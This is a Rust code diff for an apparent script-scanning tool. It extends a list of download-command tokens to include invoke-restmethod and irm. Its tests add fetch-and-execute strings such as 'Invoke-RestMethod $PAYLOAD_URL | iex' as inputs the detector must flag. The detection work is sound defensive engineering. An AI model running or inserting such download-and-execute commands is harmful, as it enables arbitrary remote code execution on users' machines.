@@ -28,7 +28,14 @@ use std::path::Path;
 const HASH_COMMENT_LANGUAGES: &[&str] = &[
     "sh", "bash", "zsh", "ksh", "fish", "py", "rb", "pl", "yaml", "yml", "ps1", "psm1", "psd1",
 ];
-const SCRIPT_DOWNLOAD_COMMAND_TOKENS: &[&str] = &["curl", "wget", "invoke-webrequest", "iwr"];
+const SCRIPT_DOWNLOAD_COMMAND_TOKENS: &[&str] = &[
+    "curl",
+    "wget",
+    "invoke-webrequest",
+    "iwr",
+    "invoke-restmethod",
+    "irm",
+];
 
 /// Strip inline `#` comments from `content` for the languages in
 /// [`HASH_COMMENT_LANGUAGES`], preserving line structure (line count
@@ -664,6 +671,8 @@ mod tests {
             "exec('curl\t$PAYLOAD_URL | sh')\n",
             "iwr\t$PAYLOAD_URL | iex\n",
             "iwr($PAYLOAD_URL) | iex\n",
+            "Invoke-RestMethod\t$PAYLOAD_URL | iex\n",
+            "irm($PAYLOAD_URL) | iex\n",
         ] {
             let caps = script_capabilities(content);
             assert!(
@@ -690,6 +699,7 @@ mod tests {
             "exec('mycurl\t$PAYLOAD_URL')\n",
             "kiwr\t$PAYLOAD_URL | iex\n",
             "kiwr($PAYLOAD_URL) | iex\n",
+            "confirm($PAYLOAD_URL) | iex\n",
         ] {
             let links = script_relations(content);
             assert!(
